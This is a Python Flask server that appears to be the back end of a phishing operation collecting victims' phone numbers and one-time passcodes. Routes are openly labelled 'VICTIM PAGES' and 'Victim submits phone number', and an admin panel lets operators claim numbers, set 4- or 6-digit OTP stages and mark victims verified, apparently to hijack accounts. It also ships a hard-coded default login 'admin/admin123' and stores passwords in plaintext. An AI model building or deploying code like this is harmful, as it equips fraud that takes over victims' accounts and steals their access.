from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import json
import os
import uuid
from datetime import datetime

app = Flask(__name__, static_folder='.')
CORS(app)

# ============================================================
# DATA FILES
# ============================================================

DB_FILE = 'database.json'
CONFIG_FILE = 'config.json'

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {"queues": {"A": [], "B": [], "C": []}, "users": [], "history": []}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {"admins": []}

def save_config(data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ============================================================
# ROUTES - VICTIM PAGES
# ============================================================

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/admin')
def admin():
    return send_from_directory('.', 'admin.html')

# ============================================================
# ROUTES - API
# ============================================================

@app.route('/api/submit', methods=['POST'])
def submit_number():
    """Victim submits phone number"""
    data = request.json
    queue_id = str(uuid.uuid4())[:8]
    db = load_db()
    
    queue_letter = data.get('queue', 'C')
    if queue_letter not in db['queues']:
        db['queues'][queue_letter] = []
    
    entry = {
        'id': queue_id,
        'number': data.get('number'),
        'country': data.get('country'),
        'network': data.get('network'),
        'timestamp': datetime.now().isoformat(),
        'status': 'pending',      # pending, claimed, otp_sent, verified, wrong
        'otp_length': 4,
        'otp': None,
        'verified': False
    }
    
    db['queues'][queue_letter].append(entry)
    save_db(db)
    
    return jsonify({'success': True, 'queueId': queue_id, 'queue': queue_letter})

@app.route('/api/admin/queues', methods=['GET'])
def get_queues():
    """Get all queue data for admin panel"""
    db = load_db()
    return jsonify(db['queues'])

@app.route('/api/admin/update', methods=['POST'])
def update_entry():
    """Update a queue entry (OTP, wrong, verified, claim)"""
    data = request.json
    queue_id = data.get('queueId')
    action = data.get('action')
    otp_value = data.get('otp')
    
    db = load_db()
    
    for queue_letter, entries in db['queues'].items():
        for entry in entries:
            if entry['id'] == queue_id:
                
                # --- CLAIM ---
                if action == 'claimed':
                    entry['status'] = 'claimed'
                    save_db(db)
                    return jsonify({'success': True})
                
                # --- WRONG NUMBER ---
                elif action == 'wrong':
                    entry['status'] = 'wrong'
                    save_db(db)
                    return jsonify({'success': True})
                
                # --- VERIFIED ---
                elif action == 'verified':
                    entry['status'] = 'verified'
                    entry['verified'] = True
                    save_db(db)
                    return jsonify({'success': True})
                
                # --- OTP 4-DIGIT ---
                elif action == 'otp_4':
                    otp = otp_value or str(1000 + (int(queue_id, 16) % 9000))
                    entry['otp_length'] = 4
                    entry['otp'] = otp
                    entry['status'] = 'otp_sent'
                    save_db(db)
                    return jsonify({'success': True, 'otp': otp})
                
                # --- OTP 6-DIGIT ---
                elif action == 'otp_6':
                    otp = otp_value or str(100000 + (int(queue_id, 16) % 900000))
                    entry['otp_length'] = 6
                    entry['otp'] = otp
                    entry['status'] = 'otp_sent'
                    save_db(db)
                    return jsonify({'success': True, 'otp': otp})
                
                # --- VERIFY OTP (Victim) ---
                elif action == 'verify_otp':
                    user_otp = data.get('otp')
                    if entry.get('otp') == user_otp:
                        entry['status'] = 'verified'
                        entry['verified'] = True
                        save_db(db)
                        return jsonify({'success': True})
                    else:
                        return jsonify({'success': False})
                
                else:
                    return jsonify({'success': False, 'message': 'Unknown action'})
    
    return jsonify({'success': False, 'message': 'Entry not found'})

@app.route('/api/admin/stats', methods=['GET'])
def get_stats():
    """Get global stats for admin panel"""
    db = load_db()
    total = 0
    pending = 0
    verified = 0
    wrong = 0
    otp_sent = 0
    
    for queue_letter, entries in db['queues'].items():
        total += len(entries)
        pending += len([e for e in entries if e['status'] == 'pending'])
        verified += len([e for e in entries if e['status'] == 'verified'])
        wrong += len([e for e in entries if e['status'] == 'wrong'])
        otp_sent += len([e for e in entries if e['status'] == 'otp_sent'])
    
    return jsonify({
        'total': total,
        'pending': pending,
        'verified': verified,
        'wrong': wrong,
        'otp_sent': otp_sent
    })

# ============================================================
# ROUTES - ADMIN AUTH
# ============================================================

@app.route('/api/admin/auth', methods=['POST'])
def admin_auth():
    """Authenticate admin user"""
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    config = load_config()
    for admin in config['admins']:
        if admin['username'] == username and admin['password'] == password:
            token = str(uuid.uuid4())
            admin['token'] = token
            admin['last_login'] = datetime.now().isoformat()
            save_config(config)
            return jsonify({'success': True, 'token': token})
    
    return jsonify({'success': False, 'message': 'Invalid credentials'})

@app.route('/api/admin/verify_token', methods=['POST'])
def verify_token():
    """Verify admin token"""
    data = request.json
    token = data.get('token')
    
    config = load_config()
    for admin in config['admins']:
        if admin.get('token') == token:
            return jsonify({'success': True, 'username': admin['username']})
    
    return jsonify({'success': False})

@app.route('/api/admin/change_password', methods=['POST'])
def change_password():
    """Change admin password"""
    data = request.json
    username = data.get('username')
    old_password = data.get('old_password')
    new_password = data.get('new_password')
    
    config = load_config()
    for admin in config['admins']:
        if admin['username'] == username and admin['password'] == old_password:
            admin['password'] = new_password
            admin['last_changed'] = datetime.now().isoformat()
            save_config(config)
            return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': 'Invalid credentials'})

# ============================================================
# ROUTES - CLEANUP
# ============================================================

@app.route('/api/admin/clear_queue', methods=['POST'])
def clear_queue():
    """Clear all entries in a specific queue"""
    data = request.json
    queue_letter = data.get('queue', 'C')
    
    db = load_db()
    if queue_letter in db['queues']:
        db['queues'][queue_letter] = []
        save_db(db)
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': 'Queue not found'})

@app.route('/api/admin/delete_entry', methods=['POST'])
def delete_entry():
    """Delete a specific entry by ID"""
    data = request.json
    queue_id = data.get('queueId')
    
    db = load_db()
    for queue_letter, entries in db['queues'].items():
        for i, entry in enumerate(entries):
            if entry['id'] == queue_id:
                db['queues'][queue_letter].pop(i)
                save_db(db)
                return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': 'Entry not found'})

# ============================================================
# INIT
# ============================================================

if __name__ == '__main__':
    # Create default admin if none exists
    config = load_config()
    if not config['admins']:
        config['admins'].append({
            'username': 'admin',
            'password': 'admin123',
            'created': datetime.now().isoformat()
        })
        save_config(config)
        print("✅ Default admin created: admin / admin123")
    
    # Ensure database file exists
    db = load_db()
    if not db['queues']:
        db['queues'] = {"A": [], "B": [], "C": []}
        save_db(db)
        print("✅ Database initialized")
    
    print("🚀 Server running on port 10000")
    app.run(host='0.0.0.0', port=10000)
